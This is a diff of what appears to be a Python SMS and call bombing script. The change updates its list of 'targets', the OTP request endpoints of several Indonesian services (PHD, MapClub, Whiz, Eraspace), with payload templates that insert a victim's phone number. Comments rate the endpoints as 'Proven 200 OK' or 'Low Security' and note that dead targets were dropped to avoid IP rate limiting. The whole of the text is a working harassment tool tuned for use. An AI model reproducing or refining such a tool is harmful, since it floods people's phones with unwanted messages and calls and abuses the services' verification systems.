@@ -9,14 +9,20 @@ import sys
 sys.stdout.reconfigure(line_buffering=True) # Force Print immediately
 
 # 1. HARDCODED TARGETS (The "Magnificent Seven")
+# 1. HARDCODED TARGETS (Refined based on User Logs)
 APIS = [
-    {"name": "KlikDokter-WA", "url": "https://auth.klikdokter.com/api/v1/otp", "method": "POST", "json": {"phone": "{c}", "channel": "wa"}},
-    {"name": "Nutriclub-SMS", "url": "https://membership.nutriclub.co.id/api/otp/send", "method": "POST", "json": {"phone": "{c}", "action": "registration"}},
+    # 🌟 GOLDEN TARGETS (Proven 200 OK)
     {"name": "PHD-SMS", "url": "https://phd.co.id/en/users/sendOTP", "method": "POST", "data": {"phone_number": "{c}"}},
+    {"name": "PHD-SMS-V2", "url": "https://phd.co.id/en/users/sendOTP", "method": "POST", "data": {"phone_number": "{c}", "type": "register"}},
+    
+    # 🆕 NEW RECRUITS (Low Security)
+    {"name": "MapClub-SMS", "url": "https://cms-api.mapclub.com/api/v1/user/otp", "method": "POST", "json": {"phone": "{c}"}},
+    {"name": "Whiz-SMS", "url": "https://api.whiz.id/v2/otp/request", "method": "POST", "json": {"phoneNumber": "{c}"}},
+    
+    # 🔄 RETRY TARGETS (Fixed Payload)
     {"name": "Eraspace-SMS", "url": "https://api.eraspace.com/customer/v1/otp", "method": "POST", "json": {"phone": "{c}", "otpType": "REGISTER"}},
-    {"name": "Marugame-SMS", "url": "https://api.marugame.co.id/api/v1/auth/otp", "method": "POST", "json": {"phoneNumber": "{phone}"}},
-    {"name": "Tokopedia-Call", "url": "https://accounts.tokopedia.com/otp/c/page/request-otp-v2", "method": "POST", "headers": {"X-Device-ID": "{semirandom}"}, "data": {"msisdn": "{c}", "otp_type": "112", "mode": "call"}},
-    {"name": "Grab-Call", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "headers": {"X-Grab-Device-ID": "{semirandom}"}, "data": {"phoneNumber": "{phone}", "countryCode": "ID", "method": "CALL"}}
+    
+    # Removed Dead/404 Targets (Tokopedia, Grab) prevents rate limiting on IP
 ]
 
 # 2. MINI UTILS
